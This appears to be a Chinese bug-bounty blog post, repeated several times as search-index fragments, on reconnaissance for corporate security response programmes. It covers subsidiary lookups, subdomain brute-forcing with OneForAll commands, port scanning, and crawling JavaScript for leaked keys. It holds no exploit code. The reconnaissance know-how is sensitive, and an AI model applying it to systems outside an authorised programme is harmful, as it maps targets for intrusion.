前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#前期信息收集"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#企业相关信息收集"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#子域名收集和网站信息收集"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#通过github收集子域名"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#oneforall"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 Goby官网:https://gobies.org/ 因为之前一直在用masscan+nmap的方式进行端口扫描，用这个项目:https://github.com/hellogoldsnakeman/masnmapscan-V1.0 前一段时间接触到goby，感觉可视化的工具用起来还是舒服，可以短时间对一些常见端口进行扫描，还能对网站进行指纹识别，报告看起来挺舒服的。 因为在实际的端口扫描过程，由于cdn或者防火墙的原因，所以没必要一上来就全端口扫描，听一位师傅分享的经验，比如当扫描到22端口开放时，说明这个ip没有cdn保护，对于这种ip我们可以提取出来，然后重点进行全端口扫描，有收获的可能性会比较大。 BBScan猪猪侠师傅写的工具，速度很快，简单的目录扫描，主要是可以探测C段下面的很多资产，扩充攻击面。 项目地址: https://github.com/lijiejie/BBScan https://github.com/yhy0/BBScan （添加了springboot的泄露探测） 可以对域名、ip、C段进行探测 快速探测管理后台 进行端口探测 探测敏感信息泄露 可以自定义扫描规则 report下看报告,误报肯定会很多，但C段下很可能会有意想不到的资产。 js信息收集主要是爬取网站的敏感js文件，js中能收集到的信息: 增加攻击面(url、域名) 敏感信息(密码、API密钥、加密方式) 代码中的潜在危险函数操作 具有已知漏洞的框架 常用的工具 速度很快的jsfinder https://github.com/Threezh1/JSFinder xray的rad爬虫 https://github.com/chaitin/rad 能够匹配敏感信息的JSINFO-SCAN：https://github.com/p1g3/JSINFO-SCAN ","date":"2023-11-30","objectID":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/:0:1","series":null,"tags":["技能"],"title":"SRC混子的漏洞挖掘之道","uri":"/src%E6%B7%B7%E5%AD%90%E7%9A%84%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B9%8B%E9%81%93/#xray"},{"categories":["学习"],"content":" 前期信息收集还是那句老话,渗透测试的本质是信息收集，对于没有0day的弱鸡选手来说，挖SRC感觉更像是对企业的资产梳理，我们往往需要花很长的时间去做信息收集，收集与此公司相关的信息，包括企业的分公司，全资子公司，网站域名、手机app,微信小程序，企业专利品牌信息，企业邮箱，电话等等，对于很多万人挖的src来说，你收集到了别人没有收集过的资产，往往离挖到漏洞就不远了。 企业相关信息收集 企查查 (https://www.qcc.com）/) 天眼查(https://www.tianyancha.com/) 启信宝（https://www.qixin.com/) 企查查、天眼查淘宝都有那种一天的会员。对于我们信息收集其实已经够用，个人更喜欢用企查查，因为它能一键导出域名，还可以直接查看企业关联的子公司，比较方便。 主要查询的信息: 一般大的src都有许多子公司,企查查可以在所属集团中查看该集团下子公司，并且可以导出。 查看同电话企业基本都是子公司。 查看股份穿透图，一般来说控股超过50%的子公司的漏洞SRC收录的可能性都比较大。 查看企业下的app、小程序、还有品牌的资产，直接在搜索引擎里搜索品牌可能会有意想不到的收获。（找到一些平常收集不到的资产) PS:一般来说100%的全资子公司src漏洞是一定会收的，其他子公司资产可能需要与src审核沟通（扯皮)。 站长之家:http://whois.chinaz.com/ 邮箱反查、注册人反查、电话反查。 推荐个项目:https://github.com/code-scan/BroDomain 兄弟域名查询。 https://www.qimai.cn/ 七麦数据，可以查到企业下一些比较冷门的app。 信息整理 当我们通过各种手段对挖掘的企业进行信息收集后，我们大致能得到以下有用的信息 主公司及分公司、子公司下所有归属的网站域名信息； 主公司及分公司、子公司下所有的专利品牌和开发的一些独立系统。 主公司及分公司、子公司下所有的app资产和微信小程序。 之后我们需要对这些信息进行归纳和整理,比如哪些是该公司的主资产，哪些是边缘资产，哪些资产看上去比较冷门，我们是可以重点关注和进行深入挖掘的。 子域名收集和网站信息收集子域名的话，对于我来说oneforall和xray的功能已经足够强大了，对于一些主域名来说，如果想要充分的收集子域名，最好用特大号字典进行最少三层的子域名爆破。这块还是layer子域名挖掘机不错。 通过github收集子域名先分享一个姿势，很多时候github上已经有热心的师傅分享了自己跑出的子域名，所以可以先到github找一找有没有现成的可以白嫖，没啥好语法，纯靠大海捞针。。 oneforAllhttps://github.com/shmilylty/OneForAll 需要到配置文件里填写api接口信息， 根据需求修改其他的配置，比如可以配置一些常见的端口，当做简单的端口扫描工具用。 命令 python oneforall.py --targets ./domain.txt run python oneforall.py --targets ./domain.txt --brute true run 我实际操作发现在挂了外网代理和没挂代理时跑出来的子域有时候差的有点大，想收集的全一点的师傅可以不挂代理和挂代理都跑一遍。然后去重一下。 xray子域名探测需要高级版，可以自己写个十几行的代码进行批量探测，也可以直接用这个项目里的代码， https://github.com/timwhitez/rad-xray 命令改一下能批量探测子域名，一般5到10分钟一个子域。 